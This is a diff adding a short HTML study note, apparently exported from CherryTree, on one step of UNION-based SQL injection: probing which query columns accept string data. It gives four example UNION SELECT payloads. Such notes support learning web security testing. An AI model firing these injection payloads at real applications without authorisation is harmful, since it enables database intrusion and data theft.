@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Finding columns with a useful data type</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Finding columns with a useful data type</h1><br/><p>Typically the data you want will be in string form, so after determining the number of required columns, probe each column to test whether it can hold string data.</p><p>This can be done by submit a series of UNION SELECT payloads that place a string value in each column one at a time.</p><p>Example:</p><p>‘ UNION SELECT ’a&#39;, NULL, NULL, NULL--</p><p>‘ UNION SELECT NULL, ’a&#39;, NULL, NULL--</p><p>‘ UNION SELECT NULL, NULL, ’a&#39;, NULL--</p><p>‘ UNION SELECT NULL, NULL, NULL, ’a&#39;--</p></div>
+</body>
+</html>
